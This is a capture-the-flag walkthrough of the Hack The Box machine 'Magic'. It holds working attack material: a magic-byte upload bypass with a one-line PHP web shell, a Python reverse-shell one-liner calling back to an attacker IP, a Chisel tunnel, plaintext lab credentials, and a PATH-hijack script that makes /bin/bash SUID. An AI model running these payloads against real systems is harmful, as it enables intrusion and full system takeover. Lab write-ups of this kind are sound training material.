# Magic

**Magic** is a medium-difficulty Linux machine on Hack The Box involving web enumeration, an unrestricted file upload vulnerability, database credential discovery, lateral movement to a local user, and SUID/PATH hijacking for root access.

**Target IP:** `10.129.82.252`

---

## Overview

The initial enumeration revealed two exposed services:

* SSH on port `22`
* HTTP on port `80`

The web application, **Magic Portfolio**, contained an upload functionality that could be bypassed using a valid JPEG magic header, allowing a PHP web shell to be uploaded and executed.

From the resulting `www-data` shell, database credentials were recovered from `db.php5`. The database contained credentials for the `theseus` user.

After obtaining access as `theseus`, SUID enumeration revealed a custom `/bin/sysinfo` binary. The binary executed system utilities without specifying absolute paths, allowing PATH hijacking. By placing a malicious `fdisk` executable in `/tmp`, the SUID binary could be abused to obtain a root shell.

---

# Enumeration

## Nmap Scan

An initial all-port scan identified two open TCP ports:

```text
22/tcp open  ssh
80/tcp open  http
```

Service and version detection provided additional information:

```text
22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http  Apache httpd 2.4.29 ((Ubuntu))
```

The web server title was:

```text
Magic Portfolio
```

The target was added to `/etc/hosts`:

```text
10.129.82.252 magic.htb
```

### Discovered Services

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 22   | SSH     | OpenSSH 7.6p1 |
| 80   | HTTP    | Apache 2.4.29 |

---

## Web Enumeration

Burp Suite was used to intercept and inspect web requests.

Directory and file enumeration was performed using **Feroxbuster**.

Some discovered paths included:

```text
http://magic.htb/
http://magic.htb/images/
http://magic.htb/assets/
http://magic.htb/assets/css/
http://magic.htb/assets/js/
http://magic.htb/assets/css/images/
```

The discovered directories did not immediately provide useful information.

Further testing of the web application revealed an upload functionality.

---

# Initial Foothold

## File Upload Enumeration

The upload functionality initially appeared to restrict uploaded files to image formats:

```text
Sorry, only JPG, JPEG & PNG files are allowed.
```

SQL injection testing was also performed using SQLMap. During the enumeration process, the application redirected requests to:

```text
http://magic.htb/upload.php
```

The upload functionality was then investigated more closely.

Uploading a file with modified content resulted in:

```text
What are you trying to do here?
```

The application also returned the following JavaScript response:

```html
<script>alert('What are you trying to do there?')</script>
```

This indicated that the application was performing additional validation on uploaded files.

---

## Bypassing the Image Validation

A real JPEG file was examined to identify its initial bytes.

JPEG files begin with valid magic bytes. Several valid JPEG signatures include:

```text
FF D8 FF DB
FF D8 FF E0 00 10 4A 46 49 46 00 01
FF D8 FF EE
FF D8 FF E1 ?? ?? 45 78 69 66 00 00
```

The upload validation could be bypassed by adding a valid JPEG magic header to a PHP file.

A simple web shell was created:

```bash
echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg
echo '<?=`$_GET[0]`?>' >> webshell.php.jpg
```

The resulting file was uploaded through the application's upload functionality.

The uploaded file was accessible under:

```text
http://magic.htb/images/uploads/webshell.php.jpg
```

Command execution was tested using:

```text
http://magic.htb/images/uploads/webshell.php.jpg?0=whoami
```

The response confirmed command execution as:

```text
www-data
```

**Initial command execution was achieved as `www-data`.**

---

# User Access

## Reverse Shell

A Python reverse shell was used to obtain an interactive shell:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.95",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

A listener was started on the attacking machine:

```bash
nc -lvnp 4444
```

The connection was received successfully:

```text
Connection received on 10.129.82.252 56470
```

The resulting shell was:

```text
www-data@ubuntu:/var/www/Magic/images/uploads$
```

A Python PTY was then spawned:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The terminal environment was also configured:

```bash
export TERM=xterm-256color
```

---

## Database Credential Discovery

After obtaining the web server shell, the application's database configuration was inspected.

The `db.php5` file contained:

```php
private static $dbName = 'Magic' ;
private static $dbHost = 'localhost' ;
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
```

This provided valid MySQL credentials:

| Username  | Password         |
| --------- | ---------------- |
| `theseus` | `iamkingtheseus` |

The database was not directly accessible remotely, so port forwarding was used.

---

## MySQL Port Forwarding with Chisel

A Chisel reverse server was started on the attacking machine:

```bash
./chisel_1.12.0_linux_amd64 server -p 7777 -reverse
```

Output:

```text
Reverse tunnelling enabled
Listening on http://0.0.0.0:7777
```

From the compromised machine, the Chisel client was started:

```bash
./chisel_1.12.0_linux_amd64 client 10.10.15.95:7777 R:3306:127.0.0.1:3306 &
```

The client successfully connected:

```text
client: Connecting to ws://10.10.15.95:7777
client: Connected
```

The forwarded port could be confirmed locally:

```bash
ss -tunlp | grep 7777
```

---

## Database Enumeration

The MySQL database was accessed using the recovered credentials:

```bash
mysql -h 127.0.0.1 -P 3306 -u theseus -piamkingtheseus
```

The database server responded:

```text
Server version: 5.7.29-0ubuntu0.18.04.1
```

Available databases were enumerated:

```sql
show databases;
```

The `Magic` database was present:

```text
information_schema
Magic
```

The login table was then queried:

```sql
select * from login;
```

The result contained:

```text
+----+----------+----------------+
| id | username | password       |
+----+----------+----------------+
|  1 | admin    | Th3s3usW4sK1ng |
+----+----------+----------------+
```

The database therefore exposed another credential:

```text
admin : Th3s3usW4sK1ng
```

More importantly, the previously discovered credentials provided access to the local `theseus` account.

---

## Access as Theseus

The `theseus` user was accessed successfully.

The home directory contained:

```text
Desktop
Downloads
Pictures
Templates
Videos
Documents
Music
Public
user.txt
```

The user flag was located in:

```text
/home/theseus/user.txt
```

---

# Privilege Escalation

## SUID Enumeration

SUID binaries were enumerated using:

```bash
find / -perm -4000 -exec ls -l {} \; 2>/dev/null
```

Among the results was a notable custom binary:

```text
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
```

The binary was SUID and owned by root.

This made `/bin/sysinfo` an interesting privilege-escalation target.

---

## Analyzing `/bin/sysinfo`

The binary was inspected using `strings`:

```bash
strings /bin/sysinfo
```

Interesting output included:

```text
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
```

The important observation was that commands such as:

```text
lshw
fdisk
cat
```

were executed without absolute paths.

This opened the possibility of **PATH hijacking**.

---

# Root Access

## PATH Hijacking

When Linux executes a command without an absolute path, it searches the directories specified in the `PATH` environment variable.

The attack path was to place a malicious executable in a directory writable by the current user and then prepend that directory to `PATH`.

The `/tmp` directory was used.

One approach involved creating a malicious `fdisk` executable.

The malicious file contained:

```bash
#!/bin/sh
chmod +s /bin/bash
```

It was then made executable:

```bash
chmod +x fdisk
```

The `/tmp` directory was placed at the beginning of `PATH`:

```bash
export PATH='/tmp':$PATH
```

When `/bin/sysinfo` was executed, its call to:

```text
fdisk -l
```

resolved to the malicious `/tmp/fdisk` executable instead of the legitimate system binary.

The malicious executable therefore changed `/bin/bash` to SUID.

---

## Obtaining the Root Shell

After the SUID bit was set on `/bin/bash`, the privileged shell was spawned with:

```bash
bash -p
```

This resulted in a root shell:

```text
bash-4.4#
```

The `/root` directory was accessible:

```bash
ls /root
```

Output:

```text
info.c
root.txt
snap
```

The root flag was located at:

```text
/root/root.txt
```

**Root access was successfully obtained through SUID + PATH hijacking.**

---

# Attack Path Summary

```text
Initial Enumeration
        |
        v
22/tcp SSH
80/tcp HTTP
        |
        v
Magic Portfolio
        |
        v
File Upload Functionality
        |
        v
JPEG Magic-Byte Validation Bypass
        |
        v
PHP Web Shell
        |
        v
Command Execution as www-data
        |
        v
Reverse Shell
        |
        v
db.php5
        |
        v
MySQL Credentials
        |
        v
Chisel Port Forwarding
        |
        v
Magic Database
        |
        v
theseus Credentials
        |
        v
User Access
        |
        v
SUID Enumeration
        |
        v
/bin/sysinfo
        |
        v
Commands Executed Without Absolute Paths
        |
        v
PATH Hijacking
        |
        v
Malicious fdisk
        |
        v
SUID /bin/bash
        |
        v
bash -p
        |
        v
ROOT
```

---

# Key Takeaways

* Always investigate file-upload functionality beyond the obvious extension checks.
* File signatures or **magic bytes** can sometimes be used to bypass weak upload validation.
* Once a web shell is obtained, application configuration files are valuable sources of credentials.
* Internal services that are not remotely exposed can still be accessed through port forwarding.
* SUID enumeration should include custom binaries, not only standard system utilities.
* Programs running commands without absolute paths should always be investigated for **PATH hijacking**.
* A root-owned SUID binary combined with an attacker-controlled `PATH` can lead to complete privilege escalation.

---

# Tools Used

* Nmap
* Feroxbuster
* Burp Suite
* SQLMap
* Netcat
* Python
* Chisel
* MySQL
* `strings`
* `find`
* Linux SUID enumeration

---

# Conclusion

**Magic** demonstrated a complete Linux attack chain starting from web enumeration and ending in root access.

The initial foothold was obtained by bypassing weak image-upload validation and executing a PHP web shell. From there, application configuration files exposed database credentials, and database enumeration led to access as the `theseus` user.

The final privilege escalation relied on a custom SUID binary that executed system commands without absolute paths. By controlling the `PATH` and hijacking the `fdisk` command, the SUID permission on `/bin/bash` was enabled and a privileged shell was obtained.

The machine was a good demonstration of why secure file validation, credential protection, least privilege, and safe command execution are all important parts of Linux and web application security.
